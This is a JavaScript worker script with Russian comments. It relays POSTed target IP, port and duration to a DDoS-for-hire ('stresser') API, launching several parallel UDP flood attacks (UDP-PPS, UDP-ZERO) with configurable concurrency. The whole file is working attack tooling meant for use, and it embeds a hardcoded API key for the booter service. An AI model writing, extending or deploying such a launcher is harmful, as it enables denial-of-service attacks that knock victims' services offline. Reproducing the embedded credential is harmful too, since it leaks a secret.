// ============================================================================
//                    НАСТРОЙКИ АТАК - РЕДАКТИРУЙ ЗДЕСЬ!
// ============================================================================

const RETROSTRESS_API_URL = "https://retrostress.net/api/v1/tests";
const RETROSTRESS_API_KEY = "545dc2907e14a4a5aa893a909e178732bbec33849eaf7769811bf4a9ae74fb9e";

// КОНФИГУРАЦИЯ АТАК - настраивай количество и типы здесь!
const ATTACK_CONFIG = [
  { method: "UDP-PPS", concurrent: 4 },   // Атака 1
  { method: "UDP-PPS", concurrent: 4 },   // Атака 2
  { method: "UDP-ZERO", concurrent: 4 },  // Атака 3
  { method: "UDP-ZERO", concurrent: 4 },  // Атака 4
];

// ИТОГО: 2× UDP-PPS + 2× UDP-ZERO
// Можешь добавить больше атак в массив!

// Задержка между запуском атак (миллисекунды)
const DELAY_BETWEEN_ATTACKS = 100; // 0.1 секунда между атаками

// ============================================================================
//                         КОД (НЕ ТРОГАЙ)
// ============================================================================

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  };

  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  if (request.method === 'GET') {
    return new Response(JSON.stringify({
      status: 'online',
      attacks_configured: ATTACK_CONFIG.length,
      methods: ATTACK_CONFIG.map(a => a.method)
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    });
  }

  if (request.method === 'POST') {
    try {
      const body = await request.json();
      const { ip, port, time } = body;
      
      if (!ip || !port || !time) {
        return new Response(JSON.stringify({
          status: 'error',
          message: 'Missing required fields'
        }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      console.log(`📥 Received: ${ip}:${port} for ${time}s`);
      console.log(`🚀 Launching ${ATTACK_CONFIG.length} attacks...`);

      // Запускаем все атаки параллельно с небольшой задержкой
      const attackPromises = ATTACK_CONFIG.map((config, index) => {
        return new Promise(resolve => {
          // Задержка перед каждой атакой
          setTimeout(async () => {
            const payload = {
              target: ip,
              port: parseInt(port),
              duration: parseInt(time),
              method: config.method,
              concurrent: config.concurrent,
              customId: `Creys-${index + 1}-${Date.now()}`
            };

            console.log(`   Attack ${index + 1}/${ATTACK_CONFIG.length}: ${config.method} (concurrent: ${config.concurrent})`);

            try {
              const response = await fetch(RETROSTRESS_API_URL, {
                method: 'POST',
                headers: {
                  'Authorization': `Bearer ${RETROSTRESS_API_KEY}`,
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
              });

              const result = await response.text();
              console.log(`   ✅ Attack ${index + 1} response: ${response.status}`);
              
              resolve({
                success: response.ok,
                status: response.status,
                method: config.method,
                index: index + 1
              });
            } catch (error) {
              console.log(`   ❌ Attack ${index + 1} failed: ${error.message}`);
              resolve({
                success: false,
                error: error.message,
                method: config.method,
                index: index + 1
              });
            }
          }, index * DELAY_BETWEEN_ATTACKS);
        });
      });

      // Ждём завершения всех атак
      const results = await Promise.all(attackPromises);
      
      // Подсчитываем успешные атаки
      const successCount = results.filter(r => r.success).length;
      
      console.log(`📊 Results: ${successCount}/${ATTACK_CONFIG.length} attacks launched successfully`);

      return new Response(JSON.stringify({
        status: 'success',
        message: `${successCount}/${ATTACK_CONFIG.length} attacks launched`,
        target: `${ip}:${port}`,
        duration: time,
        attacks: results
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });

    } catch (error) {
      console.error('❌ Error:', error);
      
      return new Response(JSON.stringify({
        status: 'error',
        message: error.message
      }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
  }

  return new Response('Method not allowed', { 
    status: 405,
    headers: corsHeaders 
  });
}
